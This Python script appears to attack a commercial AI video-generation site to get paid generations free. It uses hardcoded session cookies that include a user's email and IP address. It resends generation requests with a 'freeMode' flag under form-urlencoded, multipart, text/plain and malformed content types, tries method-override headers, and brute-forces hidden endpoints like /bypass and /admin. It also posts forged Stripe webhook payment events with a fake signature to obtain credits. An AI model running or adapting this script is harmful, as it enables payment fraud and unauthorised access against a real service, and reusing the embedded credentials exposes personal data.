"""
Two promising angles from bypass_hunt:
1. form-urlencoded → 500 (server may have created job before crash)
2. Stripe webhook replay — fake credits-added event
"""
import requests, json, time, urllib.parse, re

BASE = 'https://viddo.ai'
SESSION_TOKEN = 'CiqAykZneKhsNT1S6iRNR75QS6Cj2n2X.g4pzFoA9Mql5aDBC3K+UuqgVTxeoOndb+eTAmGk1GKc='
SESSION_DATA = ('eyJzZXNzaW9uIjp7InNlc3Npb24iOnsiZXhwaXJlc0F0IjoiMjAyNi0wNS0wNVQwNjozNzo1OC41MjRaIiwidG9rZW4iOiJDaXFBeWtabmVLaHNOVDFTNmlSTlI3NVFTNkNqMm4yWCIsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMjhUMDY6Mzc6NTguNTI0WiIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMjhUMDY6Mzc6NTguNTI0WiIsImlwQWRkcmVzcyI6IjExMS45My4xMi4xNDIiLCJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxNTIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xNTIuMCIsInVzZXJJZCI6InNYWFZXQUthbWlJQjdlN001WDgzZG5TclRtcFJ1UXo4IiwiaWQiOiJTOVRQVFN4TWFFdUhKQTNmUzRURmJubHdDZmE3WW1hcyJ9LCJ1c2VyIjp7Im5hbWUiOiJhaHk0OEB0ZW1wZWR1bWFpbC5tZSIsImVtYWlsIjoiYWh5NDhAdGVtcGVkdW1haWwubWUiLCJlbWFpbFZlcmlmaWVkIjp0cnVlLCJpbWFnZSI6bnVsbCwiY3JlYXRlZEF0IjoiMjAyNi0wNC0wOFQwMjo1OTozNS4zNDRaIiwidXBkYXRlZEF0IjoiMjAyNi0wNC0wOFQwMjo1OTozNS4zNDRaIiwiaWQiOiJzWFhWV0FLYW1pSUI3ZTdNNVg4M2RuU3JUbXBSdVF6OCJ9LCJ1cGRhdGVkQXQiOjE3NzczNTg2MTExMzMsInZlcnNpb24iOiIxIn0sImV4cGlyZXNBdCI6MTc3NzM1ODkxMTEzMywic2lnbmF0dXJlIjoidy1vU3BkNG1UTXhMUl9wNHFNc3FVTVhWbkEzc2R5N1lteWNFb3BsT0VzdyJ9')
COOKIES = {'__Secure-better-auth.session_token': SESSION_TOKEN, '__Secure-better-auth.session_data': SESSION_DATA}
H_JSON = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0',
    'Accept': '*/*', 'Content-Type': 'application/json',
    'Referer': 'https://viddo.ai/dashboard', 'Origin': 'https://viddo.ai',
    'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
}

SEED_BODY = {
    'model': 'seedance-2-0', 'channel': 'version2',
    'prompt': 'a wolf running through a snowy forest, cinematic slow motion',
    'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False,
}

# ── 1. Check current creation count (baseline) ──
def get_creation_count():
    r = requests.post(BASE + '/api/creation/get-user-creations-for-creations',
        headers=H_JSON, cookies=COOKIES,
        json={'types': ['video'], 'keyword': '', 'keywordScope': 'prompt', 'models': [], 'page': 1, 'pageSize': 5},
        timeout=10)
    d = r.json()
    lst = d.get('creations', {}).get('list', [])
    return lst

print('=== Baseline creations ===')
before = get_creation_count()
print(f'  count={len(before)}  latest={before[0].get("id") if before else None}')

# ── 2. form-urlencoded 500 — did it actually create a job? ──
print('\n=== form-urlencoded 500 test ===')
H_FORM = {**H_JSON, 'Content-Type': 'application/x-www-form-urlencoded'}
payload = urllib.parse.urlencode({**SEED_BODY, 'freeMode': 'true'})
r = requests.post(BASE + '/api/middle-layer', headers=H_FORM, cookies=COOKIES, data=payload, timeout=20)
print(f'  {r.status_code}: {r.text[:400]}')

time.sleep(2)
after = get_creation_count()
print(f'\n  After: count={len(after)}  latest={after[0].get("id") if after else None}')
if after and before and after[0].get('id') != before[0].get('id'):
    new = after[0]
    print(f'  *** NEW CREATION DETECTED! id={new["id"]} status={new.get("status_text")} model={new.get("model_id")}')

# ── 3. Multipart form data ──
print('\n=== multipart/form-data ===')
import requests.auth
files = {k: (None, str(v)) for k, v in {**SEED_BODY, 'freeMode': 'true'}.items()}
H_NOCT = {k: v for k, v in H_JSON.items() if k.lower() != 'content-type'}
r2 = requests.post(BASE + '/api/middle-layer', headers=H_NOCT, cookies=COOKIES, files=files, timeout=20)
print(f'  {r2.status_code}: {r2.text[:300]}')

# ── 4. Webhook replay — find the Stripe webhook endpoint ──
print('\n=== Stripe webhook paths ===')
for path in [
    '/api/webhook/stripe', '/api/webhooks/stripe', '/api/stripe/webhook',
    '/api/stripe', '/api/webhook', '/api/webhooks',
    '/api/payment/webhook', '/api/billing/webhook',
]:
    r3 = requests.post(BASE + path, headers={**H_JSON, 'Stripe-Signature': 't=1234,v1=fake'},
        json={'type': 'invoice.payment_succeeded', 'data': {'object': {'customer': 'cus_test', 'amount_paid': 0}}},
        timeout=8)
    if r3.status_code not in (404, 405):
        print(f'  {path}: {r3.status_code}: {r3.text[:200]}')

# ── 5. Try sending the generation body as a plain text JSON string (bypass JSON parser) ──
print('\n=== Raw string body (bypass JSON validation) ===')
H_TEXT = {**H_JSON, 'Content-Type': 'text/plain'}
r4 = requests.post(BASE + '/api/middle-layer', headers=H_TEXT, cookies=COOKIES,
    data=json.dumps({**SEED_BODY, 'freeMode': True}), timeout=15)
print(f'  text/plain: {r4.status_code}: {r4.text[:300]}')

H_TEXT2 = {**H_JSON, 'Content-Type': 'application/json; boundary=xxx'}
r5 = requests.post(BASE + '/api/middle-layer', headers=H_TEXT2, cookies=COOKIES,
    data=json.dumps({**SEED_BODY, 'freeMode': True}), timeout=15)
print(f'  json+boundary: {r5.status_code}: {r5.text[:300]}')

# ── 6. HTTP method override tricks ──
print('\n=== Method override ===')
H_METH = {**H_JSON, 'X-HTTP-Method-Override': 'PATCH', 'X-Method-Override': 'PATCH'}
r6 = requests.post(BASE + '/api/middle-layer', headers=H_METH, cookies=COOKIES,
    json={**SEED_BODY, 'freeMode': True}, timeout=15)
print(f'  method-override PATCH: {r6.status_code}: {r6.text[:200]}')

# ── 7. Check if there's a separate /api/middle-layer/bypass or /api/middle-layer/free ──
print('\n=== Middle-layer subpaths ===')
for subpath in ['/free', '/bypass', '/admin', '/test', '/demo', '/internal',
                '/v2', '/v1', '/generate', '/create', '/submit']:
    r7 = requests.post(BASE + '/api/middle-layer' + subpath, headers=H_JSON, cookies=COOKIES,
        json=SEED_BODY, timeout=8)
    if r7.status_code not in (404, 405):
        print(f'  /api/middle-layer{subpath}: {r7.status_code}: {r7.text[:200]}')
    else:
        print(f'  /api/middle-layer{subpath}: {r7.status_code}')

print('\nDone.')
